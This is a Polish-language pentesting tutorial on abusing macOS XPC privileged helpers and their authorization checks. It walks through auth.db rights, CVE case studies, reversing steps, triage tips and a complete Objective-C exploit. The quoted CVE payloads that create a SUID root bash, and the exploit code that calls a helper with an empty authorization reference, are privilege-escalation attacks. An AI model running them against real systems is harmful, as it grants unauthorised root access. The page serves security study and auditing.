# Autoryzacja XPC

{{#include ../../../../../banners/hacktricks-training.md}}

## Autoryzacja XPC

Apple udostępnia również inny sposób uwierzytelniania, czy proces nawiązujący połączenie ma **uprawnienia do wywołania udostępnionej metody XPC**.<sup>[[2]](#references)</sup>

Gdy aplikacja musi **wykonywać działania jako uprzywilejowany użytkownik**, zamiast uruchamiać aplikację jako uprzywilejowany użytkownik zazwyczaj instaluje jako root narzędzie HelperTool jako usługę XPC, która może być wywoływana z aplikacji w celu wykonania tych działań. Jednak aplikacja wywołująca usługę powinna mieć wystarczające uprawnienia.

### ShouldAcceptNewConnection zawsze YES

Przykład można znaleźć w [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). W pliku `App/AppDelegate.m` aplikacja próbuje **nawiązać połączenie** z **HelperTool**. Natomiast w pliku `HelperTool/HelperTool.m` funkcja **`shouldAcceptNewConnection`** **nie sprawdza** żadnego z wcześniej wskazanych wymagań. Zawsze zwraca YES:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Więcej informacji o prawidłowej konfiguracji tego sprawdzenia:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Uprawnienia aplikacji

Jednak **podczas wywoływania metody z HelperTool odbywa się pewna autoryzacja**.

Funkcja **`applicationDidFinishLaunching`** z `App/AppDelegate.m` utworzy pusty reference autoryzacji po uruchomieniu aplikacji. Powinno to zawsze działać.\
Następnie spróbuje **dodać pewne uprawnienia** do tego reference autoryzacji, wywołując `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Funkcja `setupAuthorizationRights` z pliku `Common/Common.m` zapisze w bazie autoryzacji `/var/db/auth.db` uprawnienia aplikacji. Zwróć uwagę, że doda tylko te uprawnienia, których nie ma jeszcze w bazie danych:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Funkcja `enumerateRightsUsingBlock` służy do pobierania uprawnień aplikacji, które są zdefiniowane w `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Oznacza to, że na końcu tego procesu uprawnienia zadeklarowane wewnątrz `commandInfo` zostaną zapisane w `/var/db/auth.db`. Dla **każdej metody**, która będzie **wymagać uwierzytelnienia**, baza danych zawiera **nazwę uprawnienia** oraz **`kCommandKeyAuthRightDefault`**. To drugie **wskazuje, kto może uzyskać to uprawnienie**.<sup>[[1]](#references)</sup>

Istnieją różne zakresy określające, kto może uzyskać dostęp do uprawnienia. Niektóre z nich są zdefiniowane w [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) ( [wszystkie można znaleźć tutaj](https://www.dssw.co.uk/reference/authorization-rights/) ), ale podsumowanie wygląda następująco:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Nazwa</th><th width="165">Wartość</th><th>Opis</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Każdy</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nikt</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Bieżący użytkownik musi być administratorem (należeć do grupy administratorów)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Poproś użytkownika o uwierzytelnienie.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Poproś użytkownika o uwierzytelnienie. Musi on być administratorem (należeć do grupy administratorów)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Określa reguły</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Określa dodatkowe informacje dotyczące uprawnienia</td></tr></tbody></table>

### Weryfikacja uprawnień

W `HelperTool/HelperTool.m` funkcja **`readLicenseKeyAuthorization`** sprawdza, czy wywołujący jest uprawniony do **wykonania takiej metody**, wywołując funkcję **`checkAuthorization`**. Funkcja ta sprawdzi, czy **`authData`** wysłane przez proces wywołujący ma **prawidłowy format**, a następnie sprawdzi, **co jest wymagane do uzyskania uprawnienia** do wywołania określonej metody. Jeśli wszystko przebiegnie prawidłowo, zwrócone **`error` będzie miało wartość `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Aby **sprawdzić wymagania dotyczące uzyskania odpowiedniego** prawa do wywołania tej metody, `authorizationRightForCommand` sprawdza wspomniany wcześniej obiekt **`commandInfo`**. Następnie wywołuje **`AuthorizationCopyRights`**, aby sprawdzić, **czy wywołujący ma uprawnienia** do wywołania funkcji (zwróć uwagę, że flagi umożliwiają interakcję z użytkownikiem).<sup>[[1]](#references)[[3]](#references)</sup>

W tym przypadku, aby wywołać funkcję `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` jest zdefiniowane jako `@kAuthorizationRuleClassAllow`. Oznacza to, że **każdy może ją wywołać**.

### Informacje o bazie danych

Wspomniano, że te informacje są przechowywane w `/var/db/auth.db`. Wszystkie zapisane reguły można wyświetlić za pomocą:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Następnie możesz sprawdzić, kto może uzyskać dostęp do tego uprawnienia za pomocą:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

Możesz znaleźć **wszystkie konfiguracje uprawnień** [**tutaj**](https://www.dssw.co.uk/reference/authorization-rights/), ale kombinacje, które nie będą wymagać interakcji użytkownika, to:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- Jest to najbardziej bezpośredni klucz. Jeśli zostanie ustawiony na `false`, oznacza to, że użytkownik nie musi uwierzytelniać się, aby uzyskać to uprawnienie.
- Jest używany **w połączeniu z jednym z 2 poniższych kluczy lub ze wskazaniem grupy**, do której użytkownik musi należeć.
2. **'allow-root': 'true'**
- Jeśli użytkownik działa jako root (który ma podwyższone uprawnienia), a ten klucz jest ustawiony na `true`, użytkownik root może potencjalnie uzyskać to uprawnienie bez dodatkowego uwierzytelniania. Zazwyczaj jednak uzyskanie statusu użytkownika root już wymaga uwierzytelnienia, więc dla większości użytkowników nie jest to scenariusz „bez uwierzytelniania”.
3. **'session-owner': 'true'**
- Jeśli wartość zostanie ustawiona na `true`, właściciel sesji (aktualnie zalogowany użytkownik) automatycznie uzyska to uprawnienie. Może to ominąć dodatkowe uwierzytelnianie, jeśli użytkownik jest już zalogowany.
4. **'shared': 'true'**
- Ten klucz nie przyznaje uprawnień bez uwierzytelniania. Jeśli zostanie ustawiony na `true`, oznacza to, że po uwierzytelnieniu uprawnienie może być współdzielone między wieloma procesami bez konieczności ponownego uwierzytelniania przez każdy z nich. Początkowe przyznanie uprawnienia nadal będzie jednak wymagać uwierzytelniania, chyba że klucz zostanie połączony z innymi kluczami, takimi jak `'authenticate-user': 'false'`.

Możesz [**użyć tego skryptu**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9), aby uzyskać interesujące uprawnienia:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Studia przypadków obejścia autoryzacji

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Uprzywilejowany serwis Mach `com.acustica.HelperTool` akceptuje każde połączenie, a jego procedura `checkAuthorization:` wywołuje `AuthorizationCopyRights(NULL, …)`, więc dowolny 32-bajtowy blob przechodzi walidację. Następnie `executeCommand:authorization:withReply:` przekazuje kontrolowane przez atakującego ciągi rozdzielane przecinkami do `NSTask` jako root, umożliwiając payloady takie jak:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trywialnie utworzyć powłokę SUID root. Szczegóły w [tym artykule](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listener zawsze zwraca YES, a ten sam wzorzec NULL `AuthorizationCopyRights` występuje w `checkAuthorization:`. Metoda `exchangeAppWithReply:` dwukrotnie konkatenazuje dane wejściowe atakującego do łańcucha `system()`, więc wstrzyknięcie metaznaków powłoki do `appPath` (np. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) umożliwia wykonanie kodu z uprawnieniami root za pośrednictwem usługi Mach `com.plugin-alliance.pa-installationhelper`. Więcej informacji [tutaj](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: uruchomienie audytu tworzy `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, udostępnia usługę Mach `com.jamf.complianceeditor.helper` i eksportuje `-executeScriptAt:arguments:then:` bez weryfikowania `AuthorizationExternalForm` ani podpisu kodu wywołującego. Trywialny exploit tworzy pustą referencję za pomocą `AuthorizationCreate`, łączy się przy użyciu `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` i wywołuje tę metodę w celu wykonania dowolnych plików binarnych jako root. Pełne notatki z reversing (wraz z PoC) znajdują się w [artykule Mykoli Grymalyuka](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac w wersjach 7.0.0–7.0.14, 7.2.0–7.2.8 oraz 7.4.0–7.4.2 akceptował spreparowane komunikaty XPC, które docierały do uprzywilejowanego helpera pozbawionego mechanizmów autoryzacji. Ponieważ helper ufał własnemu uprzywilejowanemu `AuthorizationRef`, każdy lokalny użytkownik mogący wysyłać komunikaty do usługi mógł nakłonić go do wykonania dowolnych zmian konfiguracji lub poleceń jako root. Szczegóły znajdują się w [podsumowaniu advisory SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Szybkie wskazówki dotyczące triage

- Gdy aplikacja dostarcza zarówno GUI, jak i helpera, porównaj ich wymagania dotyczące kodu i sprawdź, czy `shouldAcceptNewConnection` blokuje listener za pomocą `-setCodeSigningRequirement:` (lub weryfikuje `SecCodeCopySigningInformation`). Brak tych kontroli zwykle prowadzi do scenariuszy CWE-863, takich jak w przypadku Jamf. Szybki podgląd wygląda następująco:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Porównaj to, co helper *uważa*, że autoryzuje, z tym, co dostarcza client. Podczas reverse engineeringu ustaw breakpoint na `AuthorizationCopyRights` i potwierdź, że `AuthorizationRef` pochodzi z `AuthorizationCreateFromExternalForm` (został dostarczony przez clienta), a nie z własnego uprzywilejowanego kontekstu helpera — w przeciwnym razie prawdopodobnie znaleziono wzorzec CWE-863 podobny do powyższych przypadków.

## Odwracanie Authorization

### Sprawdzanie, czy używany jest EvenBetterAuthorization

Jeśli znajdziesz funkcję: **`[HelperTool checkAuthorization:command:]`**, prawdopodobnie proces używa wcześniej wspomnianego schematu autoryzacji:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Jeśli ta funkcja wywołuje API, takie jak `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` i `AuthorizationFree`, używa wzorca [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Sprawdź **`/var/db/auth.db`**, aby zobaczyć, czy możliwe jest uzyskanie uprawnień do wywołania uprzywilejowanej akcji bez interakcji użytkownika.

### Komunikacja protokołu

Następnie należy znaleźć schemat protokołu, aby móc nawiązać komunikację z usługą XPC.

Funkcja **`shouldAcceptNewConnection`** wskazuje eksportowany protokół:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

W tym przypadku mamy to samo co w EvenBetterAuthorizationSample — [**sprawdź tę linię**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Znając nazwę używanego protokołu, można **zrzucić jego definicję nagłówka** za pomocą:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Na koniec musimy tylko znać **name of the exposed Mach Service**, aby nawiązać z nim komunikację. Można to ustalić na kilka sposobów:

- W **`[HelperTool init]`**, gdzie można zobaczyć używany Mach Service:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- W pliku plist launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Przykład exploitacji

W tym przykładzie utworzono:

- Definicję protokołu z funkcjami
- Pusty obiekt auth używany do żądania dostępu
- Połączenie z usługą XPC
- Wywołanie funkcji, jeśli połączenie zakończyło się powodzeniem
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Inne nadużywane XPC privilege helpers

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Usługi autoryzacji](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Eskalacja uprawnień w Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Luka umożliwiająca eskalację uprawnień w FortiClient Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Lokalna eskalacja uprawnień w usłudze XPC Acustica Audio HelperTool w Aquarius Desktop na macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Lokalna eskalacja uprawnień w usłudze XPC InstallationHelper Plugin Alliance](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Eskalacja uprawnień w Apple EndpointSecurity framework (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Dokumentacja uprawnień autoryzacji (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
